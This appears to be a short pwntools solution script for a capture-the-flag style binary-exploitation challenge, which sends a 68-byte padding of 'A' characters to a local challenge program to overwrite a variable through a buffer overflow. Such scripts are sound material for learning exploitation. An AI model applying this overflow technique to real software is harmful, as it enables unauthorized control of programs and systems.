from pwn import *

r = process('/challenge/binary-exploitation-lose-variable-w')

payload = 68 * 'A'

r.sendline(payload)
r.interactive()